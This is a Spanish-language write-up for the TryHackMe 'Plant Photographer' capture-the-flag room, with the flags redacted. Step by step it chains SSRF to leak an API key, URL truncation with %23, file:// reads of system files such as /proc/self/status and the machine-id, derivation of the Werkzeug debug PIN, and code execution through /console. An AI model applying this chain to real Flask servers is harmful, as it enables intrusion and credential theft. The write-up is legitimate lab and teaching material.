# Plant Photographer

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `plantphotographer` |
| **Link** | [TryHackMe](https://tryhackme.com/room/plantphotographer) |
| **Sección** | 03 Level Hard |
| **Fuente** | Web (API THM `api/v2/rooms/tasks?roomCode=plantphotographer` + websearch de walkthroughs) |
| **Componentes** | SSRF / Werkzeug Debug Console / Flask / URL Truncation / file:// / PIN Derivation / MD5 |
| **Impacto** | Cadena SSRF → lectura arbitraria de archivos → RCE vía consola de debug de Werkzeug para leer la flag. |

---

**Contexto:** Sala Web de dificultad Hard centrada en la combinación de SSRF (Server-Side Request Forgery) con la consola interactiva de debug de Flask/Werkzeug. Se explota una descarga por URL controlada por el usuario para filtrar la X-API-KEY del servicio de almacenamiento seguro, se usa la truncación con `%23` (`#`) para controlar la URL final, se abusa de `file://` para lectura arbitraria y de un endpoint interno `/admin`, y finalmente se obtiene RCE a través de la consola de debug (PIN de Werkzeug) para leer la flag del directorio web.

## Solucionario

### Task 1: Find the Flag

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What API key is used to retrieve files from the secure storage service? | `THM{...redacted...}` |
| 2 | What is the flag in the admin section of the website? | `THM{...redacted...}` |
| 3 | What flag is stored in a text file in the server's web directory? | `THM{...redacted...}` |

---

**Metodología:**

1. Reconocimiento: `nmap -sV` → `22/tcp` SSH y `80/tcp` HTTP. El banner/encabezados revelan Werkzeug 0.16.0 de Flask.
2. SSRF en `server`: `GET /download?server=<host>&id=<id>` provoca que el servidor vuelva a tu listener un GET con `X-API-KEY: THM{...}` y el User-Agent `PycURL` → filtración del header.
3. Source leak vía debug: Al pasar un `id` no numérico, la página de debug de Werkzeug (activa por `debug=True`) filtra la ruta `/usr/src/app/app.py`. El código fuente muestra que la descarga construye `<server>/public-docs-k057230990384293/<id>.pdf` usando `pycurl`.
4. Truncación con `%23`: Terminar el parámetro `server` en `%23` (`#`) corta el sufijo fijo `/public-docs-k057230990384293/<id>.pdf`, dejándote control total de la URL que pide el servidor.
5. Endpoint interno `/admin`: Apuntando el `server` truncado a `http://localhost/admin%23` se obtiene `flag.pdf` servido por la sección admin.
6. Lectura arbitraria `file://`: Con `file:///etc/...%23` (combinando `file://` con la truncación) se leen archivos arbitrarios del contenedor.
7. Recopilar datos del PIN: Para la consola de debug se necesitan: usuario `root` (`/proc/self/status`), app path `/usr/local/lib/python3.10/site-packages/flask/app.py`, MAC de la interfaz `02:42:ac:14:00:02` → `2485378088962`, y el machine-id SOLO del cgroup (`/docker/77c09e…049ca`).
8. Calcular el PIN (Werkzeug 0.16.0): Esta versión usa MD5 (no SHA1) para derivar el PIN. Con los datos anteriores se calcula el PIN (ejemplo del writeup: `110-688-511`).
9. RCE vía `/console`: Con `debug=True` y el PIN correcto se abre `http://<host>/console` → ejecución de código Python en el servidor → se lee la flag del directorio web.

```
nmap -> 22/tcp + 80/tcp (Werkzeug 0.16.0, debug=True)
  -> /download?server=<host>&id=<id>  (server = SSRF)
  -> listener propio -> GET con X-API-KEY: THM{...} (UA PycURL)
  -> id no entero -> página debug Werkzeug -> filtra /usr/src/app/app.py
  -> url = <server>/public-docs-k057230990384293/<id>.pdf (pycurl)
  -> server terminado en %23 (#) -> corta sufijo -> control de URL
  -> /admin interno            -> flag.pdf
  -> file:// + %23             -> lectura arbitraria
  -> PIN: root (/proc/self/status) + app path + MAC 02:42:ac:14:00:02 -> 2485378088962 + machine-id SOLO cgroup
  -> Werkzeug 0.16.0 usa MD5 (no SHA1) -> PIN 110-688-511
  -> /console + PIN -> RCE Python -> flag del directorio web
```

**Learning chain:** Recon Werkzeug → SSRF en /download → Filtración de X-API-KEY → Source leak vía debug → Truncación URL con %23 → Acceso a /admin interno → Lectura arbitraria con file:// → Recopilación de datos del PIN → Derivación MD5 → RCE vía /console → Flag

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts), T1552.001 (Unsecured Credentials: Credentials In Files), T1210 (Exploitation of Remote Services)

**Fuente:** [TryHackMe - Plant Photographer](https://tryhackme.com/room/plantphotographer)
